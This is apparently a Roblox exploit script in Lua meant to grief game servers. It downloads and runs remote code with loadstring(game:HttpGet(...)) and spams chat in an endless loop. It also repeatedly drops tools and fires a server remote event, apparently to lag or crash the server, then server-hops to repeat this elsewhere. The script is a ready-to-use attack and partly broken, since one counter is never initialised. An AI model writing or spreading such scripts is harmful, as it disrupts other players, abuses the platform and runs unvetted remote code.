wait(5)

loadstring(game:HttpGet("https://raw.githubusercontent.com/v9h/dhrpvc/main/anticrash.lua", true))()

wait(1)

tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(1, Enum.EasingStyle.Linear)
tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo, {CFrame = CFrame.new(-40.08740234375, 44.05447769165039, 44.939453125)}):Play()

local function ServerHop()
    function shop()
        pcall(function()
            local Servers =
            game.HttpService:JSONDecode(
            game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")
        )
            while wait() do
                v = Servers.data[math.random(#Servers.data)]
                if v.playing < v.maxPlayers - 2 and v.id ~= game.JobId then
                    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, v.id)
                    break
                end
            end
        end)
    end


local function hop()
        shop()
        while wait() do
            pcall(shop)
        end
    end
    hop()
end

local messages = {
    "chowsengwang24325",
    "KABOOM!!!!",
    "oopsies...",
    "wong button... sorry",
    "😡 <-- you rn",
    "greetings, lance here!!",
    "🖤🖤🖤🖤🖤🖤",
    "🐱‍👤🌈🐱‍👤🌈🐱‍👤🌈🐱‍👤🌈🐱‍👤🌈🐱‍👤🌈🐱‍👤"
}

local function Chat(msg)
    wait(0.2)
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

coroutine.wrap(function()
    while true do
        Chat(messages[math.random(1, #messages)])
        wait(0)
    end
end)()

task.spawn(
    function()
        while true do
            wait()
        for _, x in next, game.Players.LocalPlayer.Backpack:GetChildren() do
            if x:IsA("Tool") then
                x.Parent = game.Players.LocalPlayer.Character
                x.Parent = workspace
            end
        end
        game.ReplicatedStorage.GiveCat:FireServer()
    end
end
)

spawn(
    function()
        while true do
            wait(0.5)
            numb = numb + 1
            if numb == 212 then
                game.Players.LocalPlayer:Kick("Serverhopping")
                wait(2)
                pcall(hop)
            end
        end
    end
)

wait(30)
ServerHop()
